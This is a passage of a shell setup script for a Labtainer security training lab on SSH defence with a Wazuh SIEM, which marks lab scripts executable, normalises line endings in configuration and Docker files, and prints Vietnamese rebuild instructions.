chmod +x "$LAB/attacker/attack.sh"
chmod +x "$LAB/siem/_bin/fixlocal.sh"
chmod +x "$LAB/siem/_bin/prestop"
chmod +x "$LAB/siem/wazuh-setup.sh"
chmod +x "$LAB/defender/_bin/student_startup.sh"

# chuan hoa line-ending (LF)
sed -i 's/\r$//' "$LAB/config/start.config"
sed -i 's/\r$//' "$LAB/config/about.txt"
sed -i 's/\r$//' "$LAB/config/parameter.config"
sed -i 's/\r$//' "$LAB/docs/read_first.txt"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.target.student"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.attacker.student"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.siem.student"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.defender.student"
sed -i 's/\r$//' "$LAB/instr_config/results.config"
sed -i 's/\r$//' "$LAB/instr_config/goals.config"
sed -i 's/\r$//' "$LAB/target/_bin/fixlocal.sh"
sed -i 's/\r$//' "$LAB/target/_bin/prestop"
sed -i 's/\r$//' "$LAB/target/_bin/treataslocal"
sed -i 's/\r$//' "$LAB/attacker/_bin/fixlocal.sh"
sed -i 's/\r$//' "$LAB/attacker/attack.sh"
sed -i 's/\r$//' "$LAB/siem/_bin/fixlocal.sh"
sed -i 's/\r$//' "$LAB/siem/_bin/prestop"
sed -i 's/\r$//' "$LAB/siem/wazuh-setup.sh"
sed -i 's/\r$//' "$LAB/defender/_bin/student_startup.sh"

echo ""
echo ">> XONG! Lab san sang tai: $LAB"
echo ">> Build & chay:"
echo "     cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-ssh-defense"
